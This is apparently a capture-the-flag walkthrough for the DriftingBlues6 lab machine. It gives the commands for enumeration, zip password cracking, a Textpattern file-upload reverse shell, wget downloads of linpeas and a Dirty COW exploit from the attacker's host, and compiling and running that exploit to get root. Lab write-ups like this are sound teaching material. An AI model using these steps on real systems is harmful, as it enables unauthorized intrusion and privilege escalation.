# DriftingBlues6

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.132.219
```

Open ports discovered:

- **80** — HTTP (Apache httpd 2.2.22, Debian)
  - Additional webpages:
    - `http://192.168.132.219/robots.txt`
    - `http://192.168.132.219/textpattern/`
    - `http://192.168.132.219/spammer`

The `robots.txt` file contained a hint:

```
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

Performed directory busting with the `.zip` extension as suggested:

```
feroxbuster --url http://192.168.132.219 -x zip -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
200      GET        2l        7w      227c http://192.168.132.219/spammer.zip
```

Downloaded `spammer.zip` from `http://192.168.132.219/spammer.zip`. The archive was password-protected. Cracked the password using `fcrackzip`:

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt spammer.zip
PASSWORD FOUND!!!!: pw == myspace4
```

Extracted the archive and found `creds.txt` containing credentials:

```
mayer:lionheart
```

### Textpattern Exploitation

The `/textpattern/` path served a landing page with links to `http://192.168.2.35/textpattern/index.php` and `http://192.168.2.35/textpattern/textpattern/index.php`. The IP address differed from the box but was still an internal IP, so it was likely hosted on the box itself.

The `/textpattern/textpattern/index.php` page was a Textpattern login page. Logged in with `mayer:lionheart`. The **Content > Files** section allowed file uploads onto the webserver. Under **Admin > Preferences > Admin**, the upload directory was revealed to be `/var/www/textpattern/files`.

Uploaded a PHP reverse shell through the file upload interface. Accessed `http://192.168.132.219/textpattern/files/reverse_shell.php` and caught the shell with `penelope`:

```
www-data@driftingblues:/$ whoami
www-data
```

This box did not have a `local.txt` file.

## Privilege escalation

Uploaded linpeas.sh via a Python HTTP server on the host:

```
# Host
python3 -m http.server 9001
ip a
inet 192.168.45.155/24

# Target
www-data@driftingblues:/$ cd /tmp
www-data@driftingblues:/tmp$ which wget
/usr/bin/wget
www-data@driftingblues:/tmp$ wget http://192.168.45.155:9001/linpeas.sh
```

Ran linpeas.sh, which indicated the system was vulnerable to the Dirty COW exploit (CVE-2016-5195).

Downloaded and compiled the exploit on the target:

```
searchsploit dirty cow
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) | linux/local/40839.c
searchsploit -m 40839

www-data@driftingblues:/tmp$ which gcc
/usr/bin/gcc
www-data@driftingblues:/tmp$ wget http://192.168.45.155:9001/40839.c
www-data@driftingblues:/tmp$ gcc 40839.c -o 40839 -pthread -lcrypt
```

Ran the exploit and set a new root password:

```
www-data@driftingblues:/tmp$ ./40839
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: root
```

Gained a privileged shell:

```
www-data@driftingblues:/tmp$ su
Password: root

firefart@driftingblues:/tmp# whoami
firefart
firefart@driftingblues:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
```

Retrieved the proof flag:

```
firefart@driftingblues:/tmp# cd /root
firefart@driftingblues:~# cat proof.txt
08359998d59b65efebe2241299846b19
```
